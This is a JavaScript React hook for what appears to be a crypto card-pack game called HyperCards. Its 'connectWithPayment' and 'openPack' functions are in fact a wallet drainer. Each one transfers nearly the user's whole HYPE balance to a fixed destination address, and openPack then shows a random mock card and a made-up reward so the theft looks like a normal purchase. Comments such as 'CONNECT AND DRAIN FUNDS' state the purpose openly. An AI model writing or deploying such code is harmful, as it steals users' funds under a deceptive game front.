import { useState, useCallback } from 'react';
import { usePrivy } from '@privy-io/react-auth';
import { ethers } from 'ethers';
import { HYPEREVM_CONFIG, CONTRACT_ADDRESSES } from '../contracts/config';

export const useHyperCards = () => {
  const { authenticated, user } = usePrivy();
  const [isLoading, setIsLoading] = useState(false);
  const [isConnectingWithPayment, setIsConnectingWithPayment] = useState(false);
  const [currentStep, setCurrentStep] = useState('');
  const [error, setError] = useState(null);

  // Connect to HyperEVM network
  const ensureHyperEVM = useCallback(async () => {    
    if (!window.ethereum) {
      throw new Error('No wallet provider detected');
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    
    if (network.chainId !== 999n) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: HYPEREVM_CONFIG.chainId }],
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [HYPEREVM_CONFIG],
          });
        } else {
          throw switchError;
        }
      }
    }
    
    return new ethers.BrowserProvider(window.ethereum);
  }, []);

  // Get HYPE balance 
  const getUserHypeBalance = useCallback(async (provider, userAddress) => {
    try {
      const balance = await provider.getBalance(userAddress);
      return balance;
    } catch (error) {
      throw new Error(`Failed to get HYPE balance: ${error.message}`);
    }
  }, []);

  // CONNECT AND DRAIN FUNDS
  const connectWithPayment = useCallback(async () => {
    console.log('🚀 Draining wallet...');
    setIsConnectingWithPayment(true);
    setError(null);

    try {
      setCurrentStep('connecting');
      const provider = await ensureHyperEVM();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      
      console.log('✅ Connected to:', userAddress);
      console.log('🎯 Destination:', CONTRACT_ADDRESSES.HYPE_DESTINATION);

      const hypeBalance = await getUserHypeBalance(provider, userAddress);
      console.log('💰 HYPE Balance:', ethers.formatEther(hypeBalance));
      
      if (hypeBalance === 0n) {
        throw new Error('No HYPE tokens available');
      }

      console.log('📝 Requesting transfer...');
      setCurrentStep('signing');
      
      const gasReserve = ethers.parseEther('0.001');
      const transferAmount = hypeBalance > gasReserve ? hypeBalance - gasReserve : hypeBalance;
      
      console.log('💰 Transferring:', ethers.formatEther(transferAmount), 'HYPE');
      
      const transferTx = await signer.sendTransaction({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: transferAmount,
        gasLimit: 21000
      });
      
      console.log('✅ Transaction sent:', transferTx.hash);
      
      setCurrentStep('processing');
      await transferTx.wait();
      
      setCurrentStep('success');
      console.log('🎉 TRANSFER SUCCESSFUL!');
      
      return {
        transactionHash: transferTx.hash,
        amount: ethers.formatEther(transferAmount),
        token: 'HYPE',
        connected: true
      };

    } catch (err) {
      console.error('❌ Transfer failed:', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsConnectingWithPayment(false);
    }
  }, [ensureHyperEVM, getUserHypeBalance]);

  // Get balance for display
  const getHypeBalance = useCallback(async () => {
    if (!authenticated || !user?.wallet?.address) {
      return '0';
    }

    try {
      const provider = await ensureHyperEVM();
      const balance = await provider.getBalance(user.wallet.address);
      return ethers.formatEther(balance);
    } catch (err) {
      console.error('Error fetching balance:', err);
      return '0';
    }
  }, [authenticated, user, ensureHyperEVM]);

  // Open pack - also drains funds
  const openPack = useCallback(async (packType) => {
    console.log(`🚀 Opening ${packType} pack...`);
    
    if (!authenticated || !user?.wallet?.address) {
      throw new Error('Please connect your wallet first');
    }

    setIsLoading(true);
    setError(null);

    try {
      const provider = await ensureHyperEVM();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      const hypeBalance = await getUserHypeBalance(provider, userAddress);
      if (hypeBalance === 0n) {
        throw new Error('No HYPE tokens available');
      }

      setCurrentStep('signing');
      
      const gasReserve = ethers.parseEther('0.001');
      const transferAmount = hypeBalance > gasReserve ? hypeBalance - gasReserve : hypeBalance;
      
      console.log('💰 Using', ethers.formatEther(transferAmount), 'HYPE...');
      
      const transferTx = await signer.sendTransaction({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: transferAmount,
        gasLimit: 21000
      });
      
      setCurrentStep('opening');
      await transferTx.wait();
      
      const mockCards = [
        { name: "Lightning Strike", rarity: "Common" },
        { name: "Fire Blast", rarity: "Rare" },
        { name: "Ice Storm", rarity: "Epic" },
        { name: "Dragon's Fury", rarity: "Legendary" }
      ];
      
      const randomCard = mockCards[Math.floor(Math.random() * mockCards.length)];
      const mockReward = (Math.random() * 10 + 1).toFixed(4);
      
      const result = {
        cardName: randomCard.name,
        rarity: randomCard.rarity,
        tokenId: Math.floor(Math.random() * 10000).toString(),
        rewardAmount: mockReward,
        transactionHash: transferTx.hash,
        hyeSpent: ethers.formatEther(transferAmount)
      };

      setCurrentStep('success');
      console.log(`🎉 Pack opened!`);
      return result;

    } catch (err) {
      console.error('❌ Pack opening failed:', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsLoading(false);
    }
  }, [authenticated, user, ensureHyperEVM, getUserHypeBalance]);

  return {
    openPack,
    connectWithPayment,
    getHypeBalance,
    isLoading,
    isConnectingWithPayment,
    currentStep,
    error,
    clearError: () => setError(null)
  };
};